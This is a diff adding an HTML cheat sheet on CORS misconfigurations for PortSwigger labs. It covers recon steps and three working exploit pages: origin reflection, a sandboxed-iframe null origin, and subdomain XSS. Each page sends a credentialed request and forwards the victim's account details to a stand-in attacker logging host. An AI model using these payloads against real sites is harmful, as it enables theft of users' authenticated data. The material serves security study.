@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>CORS</title>
+  <link rel="stylesheet" href="/static/style.css">
+
+</head>
+<body>
+<header id="title-block-header">
+</header>
+<h1 id="cross-origin-resource-sharing-cors">Cross-origin Resource
+Sharing (CORS)</h1>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><a href="#recon">General Recon For CORS Vulnerabilities</a></li>
+<li><a href="#cheat-sheet">Portswigger Labs Cheat Sheet /
+Payloads</a></li>
+</ul>
+<p><br></p>
+<h2 id="resources">Resources</h2>
+<ul>
+<li>https://portswigger.net/web-security/cors</li>
+<li>https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing</li>
+</ul>
+<p><br></p>
+<h2 id="recon">Recon</h2>
+<h3 id="identify-cors-misconfigurations">Identify CORS
+Misconfigurations</h3>
+<ul>
+<li>Analyze all the application’s responses to see if any explicitly
+support CORS
+<ul>
+<li>Access-Control-Allow-Origin: https://malicious-website.com</li>
+</ul></li>
+<li>Identify what Origins are allowed to submit CORS requests to the
+application, submit the following header in the requests:
+<ul>
+<li>Origin: <em>some-value</em></li>
+</ul></li>
+<li>Identify if any of those requests can be used to send CORS request
+with credentials:
+<ul>
+<li>Access-Control-Allow-Credentials: true</li>
+</ul></li>
+<li>The examples from the labs can help create exploits to take
+advantage of these misconfigurations</li>
+</ul>
+<p><br></p>
+<p><br></p>
+<h2 id="cheat-sheet">Cheat Sheet</h2>
+<h3 id="basic-origin-reflection">Basic Origin Reflection</h3>
+<ul>
+<li><p>The application is allowing any Origin to submit a cross-origin
+request and view the authenticated response.</p></li>
+<li><p>This is possible because the application is returning the
+following headers in a response, which contains sensitive information
+about the logged in user:</p></li>
+</ul>
+<pre><code>Access-Control-Allow-Credentials: true
+Access-Control-Allow-Origin: attacker.com</code></pre>
+<ul>
+<li><p>With these headers in the response, an attacker can host
+malicious code in their server, that will submit a request to the
+vulnerable application and direct the authenticated response back to
+their server. Now the attacker needs to trick the victim user into
+visiting their website, while they’re authenticated to the vulnerable
+application.</p>
+<ul>
+<li><em>Make sure to set the file extension to .html or no extension
+also works in Exploit Server labs</em></li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">html</span><span class="dt">&gt;</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">var</span> req <span class="op">=</span> <span class="kw">new</span> <span class="bu">XMLHttpRequest</span>()<span class="op">;</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>    req<span class="op">.</span><span class="at">onload</span> <span class="op">=</span> reqListener<span class="op">;</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>    req<span class="op">.</span><span class="fu">open</span>(<span class="st">&#39;get&#39;</span><span class="op">,</span><span class="st">&#39;https://VULNERABLE-APPLICATION.com/accountDetails&#39;</span><span class="op">,</span><span class="kw">true</span>)<span class="op">;</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>    req<span class="op">.</span><span class="at">withCredentials</span> <span class="op">=</span> <span class="kw">true</span><span class="op">;</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>    req<span class="op">.</span><span class="fu">send</span>()<span class="op">;</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">function</span> <span class="fu">reqListener</span>() {</span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>        location<span class="op">=</span><span class="st">&#39;https://ATTACKERS-SERVER-LOG-LOCATION.com/log?key=&#39;</span><span class="op">+</span><span class="kw">this</span><span class="op">.</span><span class="at">responseText</span><span class="op">;</span></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>    }<span class="op">;</span></span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">html</span><span class="dt">&gt;</span></span></code></pre></div>
+<p><br><br></p>
+<h3 id="trusted-null-origin">Trusted Null Origin</h3>
+<ul>
+<li><p>The application is only allowing the “null” Origin to submit a
+cross-origin request and view the authenticated response.</p></li>
+<li><p>This is possible because the application is returning the
+following headers in a response, which contains sensitive information
+about the logged in user:</p></li>
+</ul>
+<pre><code>Access-Control-Allow-Credentials: true
+Access-Control-Allow-Origin: null</code></pre>
+<ul>
+<li><p>With these headers in the response, an attacker can host
+malicious code in their server, that will submit a request to the
+vulnerable application and direct the authenticated response back to
+their server.<br />
+</p></li>
+<li><p>The malicious code will be within an &lt;iframe&gt; that will
+cause the browser to set the Origin header to “null”. The attacker now
+needs to trick the victim user into visiting their website, while they
+are authenticated to the vulnerable application.</p>
+<ul>
+<li><em>Make sure to set the file extension to .html or no extension
+also works in Exploit Server labs</em></li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">html</span><span class="dt">&gt;</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">iframe</span><span class="ot"> sandbox</span><span class="op">=</span><span class="st">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span><span class="ot"> srcdoc</span><span class="op">=</span><span class="st">&quot;</span><span class="er">&lt;</span><span class="st">script&gt;</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="st">    var req = new XMLHttpRequest();</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="st">    req.onload = reqListener;</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="st">    req.open(&#39;get&#39;,&#39;https://VULNERABLE-APPLICATION.com/accountDetails&#39;,true);</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="st">    req.withCredentials = true;</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="st">    req.send();</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a><span class="st">    function reqListener() {</span></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a><span class="st">        location=&#39;https://ATTACKERS-SERVER-LOG-LOCATION.com/log?key=&#39;+encodeURIComponent(this.responseText);</span></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a><span class="st">    };</span></span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a><span class="er">&lt;</span><span class="st">/script&gt;&quot;</span><span class="dt">&gt;&lt;/</span><span class="kw">iframe</span><span class="dt">&gt;</span></span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">html</span><span class="dt">&gt;</span></span></code></pre></div>
+<p><br><br></p>
+<h3 id="subdomain-origin-allowed">Subdomain Origin Allowed</h3>
+<ul>
+<li><p>The application is only allowing subdomains to send cross-origin
+requests and view the authenticated response.</p></li>
+<li><p>This is possible because the application is returning the
+following headers in a response, which contains sensitive information
+about the logged in user:</p></li>
+</ul>
+<pre><code>Access-Control-Allow-Credentials: true
+Access-Control-Allow-Origin: subdomain.vulnerable-app.com</code></pre>
+<ul>
+<li><p>If the subdomain contains a XSS vulnerability, we can inject a
+script that will submit a request to the main application and send the
+response to the attacker’s server. This will work since the subdomain is
+allowed to view the authenticated responses from the main
+application.<br />
+</p></li>
+<li><p>When the XSS script executes, the Origin header’s value will be
+<strong>subdomain.vulnerable-app.com</strong> (reason why is because the
+xss script is essentially a part of the application now). This allows
+the response to contain the authenticated data. The attacker now needs
+to trick the victim user into visiting their website, while they are
+authenticated to the vulnerable application.</p>
+<ul>
+<li><p><em>Make sure to set the file extension to .html or no extension
+also works in Exploit Server labs</em></p></li>
+<li><p>Make sure to encode the angle brackets &lt;&gt; in the payload
+within the <em>document.location</em> to prevent breaking the payload.
+This payload is the exact same as the <a
+href="#basic-origin-reflection">Basic Origin Reflection</a>, except the
+payload is injected in the XSS vulnerable parameter of the
+Subdomain.</p></li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">html</span><span class="dt">&gt;</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>    <span class="bu">document</span><span class="op">.</span><span class="at">location</span><span class="op">=</span><span class="st">&quot;http://SUBDOMAIN.VULNERABLE-APPLICATION.com/?productId=4%3cscript%3e var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#39;get&#39;,&#39;https://VULNERABLE-APPLICATION.com/accountDetails&#39;,true); req.withCredentials = true;req.send();function reqListener() {location=&#39;https://ATTACKERS-SERVER-LOG-LOCATION.net/log?key=&#39;%2bthis.responseText; };%3c/script%3e&amp;storeId=1&quot;</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">html</span><span class="dt">&gt;</span></span></code></pre></div>
+<ul>
+<li>Decoded Version:</li>
+</ul>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">html</span><span class="dt">&gt;</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>   <span class="bu">document</span><span class="op">.</span><span class="at">location</span><span class="op">=</span><span class="st">&quot;http://SUBDOMAIN.VULNERABLE-APPLICATION.com/?productId=4</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>      <span class="op">&lt;</span>script<span class="op">&gt;</span> </span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>         <span class="kw">var</span> req <span class="op">=</span> <span class="kw">new</span> <span class="bu">XMLHttpRequest</span>()<span class="op">;</span> </span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>         req<span class="op">.</span><span class="at">onload</span> <span class="op">=</span> reqListener<span class="op">;</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>         req<span class="op">.</span><span class="fu">open</span>(<span class="st">&#39;get&#39;</span><span class="op">,</span><span class="st">&#39;https://VULNERABLE-APPLICATION.com/accountDetails&#39;</span><span class="op">,</span><span class="kw">true</span>)<span class="op">;</span> </span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>         req<span class="op">.</span><span class="at">withCredentials</span> <span class="op">=</span> <span class="kw">true</span><span class="op">;</span> </span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a>         req<span class="op">.</span><span class="fu">send</span>()<span class="op">;</span></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a>         <span class="kw">function</span> <span class="fu">reqListener</span>() {</span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>            location<span class="op">=</span><span class="st">&#39;https://ATTACKERS-SERVER-LOG-LOCATION.net/log?key=&#39;</span><span class="op">+</span><span class="kw">this</span><span class="op">.</span><span class="at">responseText</span><span class="op">;</span> </span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a>      }<span class="op">;</span><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span><span class="er">&amp;</span>storeId=1&quot;</span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">html</span><span class="dt">&gt;</span></span></code></pre></div>
+<p><br><br></p>
+<h3
+id="pending-to-complete-labs-that-are-missing-from-cheat-sheet">Pending
+to complete labs that are missing from cheat sheet:</h3>
+<ul>
+<li>LAB EXPERT CORS vulnerability with internal network pivot
+attack</li>
+</ul>
+</body>
+</html>
